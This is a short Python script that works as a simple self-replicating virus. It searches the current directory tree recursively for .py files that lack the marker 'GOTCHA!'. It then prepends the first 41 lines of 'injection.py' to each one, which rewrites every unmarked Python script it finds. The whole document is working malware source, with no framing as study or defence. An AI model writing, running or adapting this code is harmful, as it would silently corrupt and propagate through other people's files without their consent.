
#!/usr/bin/python 
import os, datetime, inspect 
DATA_TO_INSERT = "GOTCHA!"
def search(path): #search for target files in path 
    filestoinfect = [] 
    filelist = os.listdir(path) 
    for filename in filelist: 
            if os.path.isdir(path+"/"+filename): #If it is a folder 
                filestoinfect.extend(search(path+"/"+filename)) 
            elif filename[-3:] == ".py": #If it is a python script -> Infect it 
                infected = False #default value 
                for line in open(path+"/"+filename): 
                    if DATA_TO_INSERT in line: 
                        infected = True
                        break
                if infected == False: 
                    filestoinfect.append(path+"/"+filename) 
    return filestoinfect 
def infect(filestoinfect): #changes to be made in the target file 
    # target_file = inspect.currentframe().f_code.co_filename 
    target_file = "injection.py"
    # print(target_file)
    virus = open(os.path.abspath(target_file)) 
    virusstring = "" 
    for i,line in enumerate(virus): 
        if i>=0 and i <41: 
            virusstring += line 
    virus.close
    blank = """

"""
    for fname in filestoinfect:
        f = open(fname) 
        temp = f.read() 
        f.close() 
        f = open(fname,"w") 
        f.write(virusstring + blank + temp) 
        f.close() 

filestoinfect = search(os.path.abspath("")) 
infect(filestoinfect)